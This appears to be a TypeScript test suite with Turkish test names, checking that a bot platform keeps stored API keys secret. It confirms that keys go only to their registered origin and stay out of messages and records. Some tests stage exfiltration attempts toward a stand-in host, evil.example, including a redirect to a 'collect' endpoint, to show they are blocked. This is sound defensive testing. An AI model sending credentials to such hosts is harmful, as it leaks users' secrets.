import { createServer, type IncomingMessage, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import type { ApiCredential, Approval, Thread } from '@yumakbot/shared';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { schema } from '../src/db';
import { testServer, waitFor, type TestServer } from './helpers';

const KEY_VALUE = 'sk-cok-gizli-anahtar-42';

/** A service that echoes back what it was sent, the key included, as careless services do. */
function echoService() {
  const seen: { method: string; url: string; headers: IncomingMessage['headers']; body: string }[] = [];
  const server: Server = createServer((req, res) => {
    let body = '';
    req.on('data', (c: Buffer) => (body += c.toString()));
    req.on('end', () => {
      seen.push({ method: req.method!, url: req.url!, headers: req.headers, body });
      if (req.url === '/redirect') {
        res.writeHead(302, { location: 'https://evil.example/collect' });
        return res.end();
      }
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(
        JSON.stringify({ ok: true, youSent: req.headers.authorization ?? req.headers['x-api-key'] ?? null }),
      );
    });
  });
  return {
    seen,
    async start() {
      await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
      return `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
    },
    close: () => new Promise<void>((r) => server.close(() => r())),
  };
}

describe('kayıtlı API anahtarları', () => {
  let t: TestServer;
  let svc: ReturnType<typeof echoService>;
  let origin: string;
  beforeEach(async () => {
    t = await testServer();
    svc = echoService();
    origin = await svc.start();
  });
  afterEach(async () => {
    await t.dispose();
    await svc.close();
  });

  const main = async (botId: string) => (await t.api<Thread>('GET', `/api/bots/${botId}/main-thread`)).body;
  const call = async (threadId: string, tool: string, input: unknown) => {
    await t.send(threadId, `[araç:${tool} ${JSON.stringify(input)}]`);
    await t.services.turns.idle();
    return (await t.messages(threadId)).at(-1)!.text;
  };

  it('bot anahtarı korumalı kartla ister; değer hiçbir yerde görünmez ve yalnız kendi adresine gider', async () => {
    const bot = await t.bot({ name: 'Entegre' });
    const thread = await main(bot.id);
    await t.send(
      thread.id,
      `[araç:credential_request ${JSON.stringify({ key: 'Ornek', origin, label: 'Örnek servis anahtarı' })}]`,
    );
    const card = await waitFor(
      async () => (await t.api<Approval[]>('GET', '/api/approvals?status=pending')).body[0],
    );
    // The card says where the key will go before it is typed.
    const q = (card.input.questions as { context: string; secret: boolean }[])[0]!;
    expect(q.secret).toBe(true);
    expect(q.context).toContain(origin);
    await t.api('POST', `/api/approvals/${card.id}`, { decision: 'allow', answer: KEY_VALUE });
    await t.services.turns.idle();
    expect((await t.messages(thread.id)).at(-1)!.text).toContain('"ornek" adıyla kaydedildi');

    const keys = (await t.api<ApiCredential[]>('GET', '/api/api-keys')).body;
    expect(keys).toHaveLength(1);
    expect(keys[0]).toMatchObject({ name: 'ornek', origin, botIds: [bot.id], auth: { type: 'bearer' } });

    // A read runs without a card; the service gets the key, the bot gets it taken out.
    const got = await call(thread.id, 'api_request', { key: 'ornek', url: '/v1/items?q=1' });
    expect(svc.seen.at(-1)!.headers.authorization).toBe(`Bearer ${KEY_VALUE}`);
    expect(svc.seen.at(-1)!.url).toBe('/v1/items?q=1');
    expect(got).toContain('HTTP 200');
    expect(got).toContain('Bearer [key]');
    expect(got).toContain('outside-data');

    // Never to another origin.
    const elsewhere = await call(thread.id, 'api_request', { key: 'ornek', url: 'https://evil.example/x' });
    expect(elsewhere).toContain(`yalnızca ${origin} adresine`);
    expect(svc.seen).toHaveLength(1);
    // Nor through a redirect.
    const redirected = await call(thread.id, 'api_request', { key: 'ornek', url: '/redirect' });
    expect(redirected).toContain('HTTP 302');
    expect(redirected).toContain('izlenmedi');
    // The bot cannot set the header the key goes in.
    const header = await call(thread.id, 'api_request', {
      key: 'ornek',
      url: '/x',
      headers: { Authorization: 'Bearer kendi' },
    });
    expect(header).toContain('sunucu ekler');

    // The value is nowhere a person or a bot reads: messages, cards, events, the key list.
    const everything = JSON.stringify([
      await t.messages(thread.id),
      await t.db.db.select().from(schema.approvals),
      await t.db.db.select().from(schema.apiCredentials),
      keys,
      t.engine.requests,
    ]);
    expect(everything).not.toContain(KEY_VALUE);
  });

  it('değiştiren istek onay düzeyine göre sorulur; başka bota ait anahtar kullanılamaz', async () => {
    const bot = await t.bot({ name: 'Yazar' });
    const other = await t.bot({ name: 'Diğer' });
    await t.services.apiCredentials.create({
      name: 'servis',
      origin,
      auth: { type: 'header', header: 'X-API-Key' },
      value: KEY_VALUE,
      botIds: [bot.id],
    });
    const thread = await main(bot.id);
    await t.send(
      thread.id,
      `[araç:api_request ${JSON.stringify({ key: 'servis', method: 'post', url: '/items', body: { a: 1 } })}]`,
    );
    const card = await waitFor(
      async () => (await t.api<Approval[]>('GET', '/api/approvals?status=pending')).body[0],
    );
    expect(card.toolName).toContain('api_request');
    await t.api('POST', `/api/approvals/${card.id}`, { decision: 'allow' });
    await t.services.turns.idle();
    const sent = svc.seen.at(-1)!;
    expect(sent.method).toBe('POST');
    expect(sent.headers['x-api-key']).toBe(KEY_VALUE);
    expect(JSON.parse(sent.body)).toEqual({ a: 1 });

    const otherThread = await main(other.id);
    expect(await call(otherThread.id, 'api_request', { key: 'servis', url: '/x' })).toContain(
      'izin verilmemiş',
    );
    expect(await call(otherThread.id, 'api_keys_list', {})).toContain('Kayıtlı API anahtarı yok');
    expect(await call(thread.id, 'api_keys_list', {})).toContain(`servis: ${origin} (X-API-Key başlığında)`);
  });

  it('uygulama anahtarları değerleri olmadan listeler; adres https olmalı', async () => {
    const created = await t.api<ApiCredential>('POST', '/api/api-keys', {
      name: 'hava',
      origin: 'api.weather.example/v2/forecast',
      auth: { type: 'query', param: 'appid' },
      value: KEY_VALUE,
    });
    expect(created.status).toBe(200);
    expect(created.body.origin).toBe('https://api.weather.example');
    expect(JSON.stringify(created.body)).not.toContain(KEY_VALUE);
    const plain = await t.api('POST', '/api/api-keys', {
      name: 'acik',
      origin: 'http://api.example.com',
      value: 'x',
    });
    expect(plain.status).toBe(400);
    const dup = await t.api('POST', '/api/api-keys', {
      name: 'hava',
      origin: 'https://a.example',
      value: 'y',
    });
    expect(dup.status).toBe(409);
    const updated = await t.api<ApiCredential>('PATCH', `/api/api-keys/${created.body.id}`, {
      label: 'Hava durumu',
    });
    expect(updated.body.label).toBe('Hava durumu');
    expect((await t.api('DELETE', `/api/api-keys/${created.body.id}`)).status).toBe(200);
    expect((await t.api<ApiCredential[]>('GET', '/api/api-keys')).body).toEqual([]);
  });
});
